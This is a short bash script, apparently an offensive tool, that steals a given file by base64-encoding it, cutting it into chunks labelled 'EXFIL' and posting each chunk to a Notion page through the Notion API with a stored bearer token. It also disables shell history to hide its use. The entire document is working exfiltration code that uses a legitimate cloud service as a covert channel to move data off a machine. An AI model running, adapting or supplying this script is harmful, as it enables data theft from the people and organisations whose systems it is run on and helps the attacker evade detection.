#!/bin/bash
HISTFILE=/dev/null

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
if [ -f "$SCRIPT_DIR/.env" ]; then
    source "$SCRIPT_DIR/.env"
fi

CHUNK_SIZE=1900

if [ $# -ne 1 ]; then
    echo "Usage: $0 <file_path>"
    exit 1
fi

if [ -z "$TOKEN" ] || [ -z "$PAGE_ID" ]; then
    echo "[-] TOKEN and PAGE_ID must be set in .env"
    exit 1
fi

FILE="$1"
FILENAME=$(basename "$FILE")

if [ ! -f "$FILE" ]; then
    echo "[-] File not found: $FILE"
    exit 1
fi

ENCODED=$(base64 "$FILE" | tr -d '\n')
TOTAL_CHUNKS=$(( (${#ENCODED} + CHUNK_SIZE - 1) / CHUNK_SIZE ))

echo "[*] File   : $FILENAME"
echo "[*] Size   : $(wc -c < "$FILE") bytes"
echo "[*] Chunks : $TOTAL_CHUNKS"

for ((i=0; i<TOTAL_CHUNKS; i++)); do
    NUM=$(printf '%03d' $((i + 1)))
    TOT=$(printf '%03d' $TOTAL_CHUNKS)
    CHUNK="${ENCODED:$((i * CHUNK_SIZE)):$CHUNK_SIZE}"
    CONTENT="[EXFIL:${NUM}/${TOT}:${FILENAME}] ${CHUNK}"

    JSON=$(EXFIL_CONTENT="$CONTENT" python3 -c "
import json, os
content = os.environ['EXFIL_CONTENT']
payload = {
    'children': [{
        'object': 'block',
        'type': 'paragraph',
        'paragraph': {
            'rich_text': [{'type': 'text', 'text': {'content': content}}]
        }
    }]
}
print(json.dumps(payload))
")

    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
        "https://api.notion.com/v1/blocks/${PAGE_ID}/children" \
        -H "Authorization: Bearer ${TOKEN}" \
        -H "Notion-Version: 2022-06-28" \
        -H "Content-Type: application/json" \
        -d "$JSON")

    if [ "$HTTP_CODE" = "200" ]; then
        echo "[+] Chunk ${NUM}/${TOT} sent"
    else
        echo "[-] Chunk ${NUM}/${TOT} failed (HTTP $HTTP_CODE)"
        exit 1
    fi
done

echo "[+] Exfiltration complete: $FILENAME ($TOTAL_CHUNKS chunks)"
